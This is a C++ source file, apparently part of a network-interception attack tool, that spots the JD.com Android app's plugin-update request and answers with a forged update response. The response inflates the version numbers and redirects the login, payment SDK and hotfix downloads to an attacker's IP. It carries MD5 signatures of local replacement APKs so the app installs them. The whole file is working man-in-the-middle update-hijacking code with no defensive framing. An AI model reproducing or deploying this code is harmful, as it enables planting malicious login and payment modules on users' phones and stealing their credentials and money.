



#include <windows.h>
#include "jingdong.h"
#include "../cipher/compression.h"
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../cipher/Base64.h"
#include "../cipher/CryptoUtils.h"
#include "../FileOper.h"
#include "../HttpUtils.h"
using namespace std;

int gJingdongPacketFlag = 0;
char *gJdUrl = "POST /client.action?functionId=apkList&";
int gJdUrlLen = lstrlenA(gJdUrl);


int JingDongPatch::isJDNextPacket(const char * pdata, int len) {

// 	if ((strstr(pdata, "\r\nHost: api.m.jd.com\r\n") &&
// 		(strstr(pdata, "body=") && strstr(pdata, "dataVersion") && strstr(pdata, "sdkVersion"))))
// 	{
// 		return TRUE;
// 	}

	if (gJingdongPacketFlag && memcmp(pdata + len - 4, "\r\n\r\n", 4) == 0)
	{ 
		if(strstr(pdata, "\r\nHost: api.m.jd.com\r\n") ||
			(strstr(pdata, "body=") && strstr(pdata, "dataVersion") && strstr(pdata, "sdkVersion")) ) 
		gJingdongPacketFlag = 0;
		return TRUE;
	}
	else if (memcmp(pdata,gJdUrl,gJdUrlLen) == 0)
	{
		gJingdongPacketFlag = 1;
	}
	return FALSE;
}



/*
{"dataVersion":1551675325000,"apkList":[{"client":"android","clientVersion":"7.4.2","isGray":0,"grayScope":"0-99","buildId":"","apkurl":"https://apk.360buyimg.com/jdmobile/libcom.jd.lib.login.so1551177451804","apksign":"14b215243b8b5d7edce9ece886a124e4","apkName":"login","versionCode":"53","sdkVersion":"","apksize":"272986","downloadType":2},{"client":"android","clientVersion":"7.4.2","isGray":0,"grayScope":"0-99","buildId":"","apkurl":"https://apk.360buyimg.com/jdmobile/libcom.jd.lib.jdpaysdk.so1551435122477","apksign":"76683d16ae81f2e4ed87768b01c186b6","apkName":"jdpaysdk","versionCode":"127","sdkVersion":"","apksize":"1949264","downloadType":1},{"client":"android","clientVersion":"7.4.2","isGray":0,"grayScope":"0-99","buildId":"65312","apkurl":"https://apk.360buyimg.com/jdmobile/patch-V7.4.2-65312-release-1.apatch1551467894752","apksign":"be8bfc03db1b5c579f69a596eef1e972","apkName":"hotfix","versionCode":"1","sdkVersion":"14,15,16,17,18,19,20,21,23,24,25,26,27,28,29","apksize":"87040","downloadType":1}],"code":"0"}
*/



JingDongPatch::JingDongPatch(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;

	string version = "9.9.6";	//7.3.6

	int buildID = 99999; //65312

	int versioncode1 = 99;		//53
	int versioncode2 = 999;		//127
	int versioncode3 = 9;		//1


	string strip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\n"
		//"HTTP/1.1 200\r\n"
		//"Server: jfe\r\n"
		"Content-Type: text/plain;charset=utf-8\r\n"
		"Content-Length: %u\r\n"
		//"Content-Encoding: gzip\r\n"
		//"Transfer-Encoding: chunked\r\n"
		//"Vary: Accept-Encoding\r\n"
		//"Connection: close\r\n\r\n%03x\r\n%s";
		//"Connection: close\r\n\r\n%x\r\n";
		"Connection: close\r\n\r\n%s";

	__int64 now = time(0) * 1000;


	char * lpRespContentFormat =
		"{\"dataVersion\":%I64u,\"apkList\":[{"
		"\"client\":\"android\",\"clientVersion\":\"%s\",\"isGray\":0,\"grayScope\":\"0-99\",\"buildId\":\"\","
		"\"apkurl\":\"http://%s/%s\",\"apksign\":\"%s\",\"apkName\":\"login\",\"versionCode\":\"%u\",\"sdkVersion\":\"\",\"apksize\":\"%u\",\"downloadType\":2},"
		"{\"client\":\"android\",\"clientVersion\":\"%s\",\"isGray\":0,\"grayScope\":\"0-99\",\"buildId\":\"\","
		"\"apkurl\":\"http://%s/%s\",\"apksign\":\"%s\",\"apkName\":\"jdpaysdk\",\"versionCode\":\"%u\",\"sdkVersion\":\"\",\"apksize\":\"%u\",\"downloadType\":1},"
		"{\"client\":\"android\",\"clientVersion\":\"%s\",\"isGray\":0,\"grayScope\":\"0-99\",\"buildId\":\"%u\","
		"\"apkurl\":\"https://%s/%s\",\"apksign\":\"%s\",\"apkName\":\"hotfix\",\"versionCode\":\"1\","
		"\"sdkVersion\":\"14,15,16,17,18,19,20,21,23,24,25,26,27,28,29\",\"apksize\":\"%u\",\"downloadType\":1}],\"code\":\"0\"}";
	//chunked 最后要\r\n0\r\n\r\n结尾 切记
	//并且该部分不算http内容长度


	string filename1 = "jd_login_out.apk";
	string filename2 = "jd_paysdk_out.apk";
	string filename3 = "jd_patch.apk";

	char szmd5_1[64] = { 0 };
	char szmd5_2[64] = { 0 };
	char szmd5_3[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize1 = CryptoUtils::getUpdateFileMd5(filepath + filename1, szmd5_1, hexmd5, TRUE);
	int filesize2 = CryptoUtils::getUpdateFileMd5(filepath + filename2, szmd5_2, hexmd5, TRUE);
	int filesize3 = CryptoUtils::getUpdateFileMd5(filepath + filename3, szmd5_3, hexmd5, TRUE);

	if (filesize1 <= 0 || filesize2 <= 0 || filesize3 <= 0)
	{
		return ;
	}

	char szdata[4096];
	int datalen = sprintf_s(szdata, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, now,
		version.c_str(), strip.c_str(), filename1.c_str(), szmd5_1, versioncode1, filesize1,
		version.c_str(), strip.c_str(), filename2.c_str(), szmd5_2, versioncode2, filesize2,
		version.c_str(), buildID, strip.c_str(), filename3.c_str(), szmd5_3, versioncode3, filesize3);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, datalen, szdata);
	//m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, datalen + 5,datalen,szdata);
	return ;


// 	unsigned char gzdata[4096+10];
// 	memmove(gzdata, "\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00", 10);
// 
// 	unsigned long gzlen = 4096 ;
// 	ret = Compress::gzcompress((unsigned char*)szdata, datalen, gzdata + 10, &gzlen );
// 	
// #ifdef _DEBUG
// 	unsigned char ungzdata[4096] = { 0 };
// 	unsigned long ungzlen = 4096;
// 	ret = Compress::gzdecompress(gzdata + 10, datalen, ungzdata, &ungzlen);
// 	int retlen = strlen((char*)ungzdata);
// #endif
// 
// 	gzlen += 10;
// 	int resphdrlen = sprintf(m_lpResp, lpRespFormat, gzlen + 5, gzlen);
// 	memmove(m_lpResp + resphdrlen, gzdata, gzlen);
// 
// 	m_iRespSize = resphdrlen + gzlen;
// 	return m_iRespSize;
}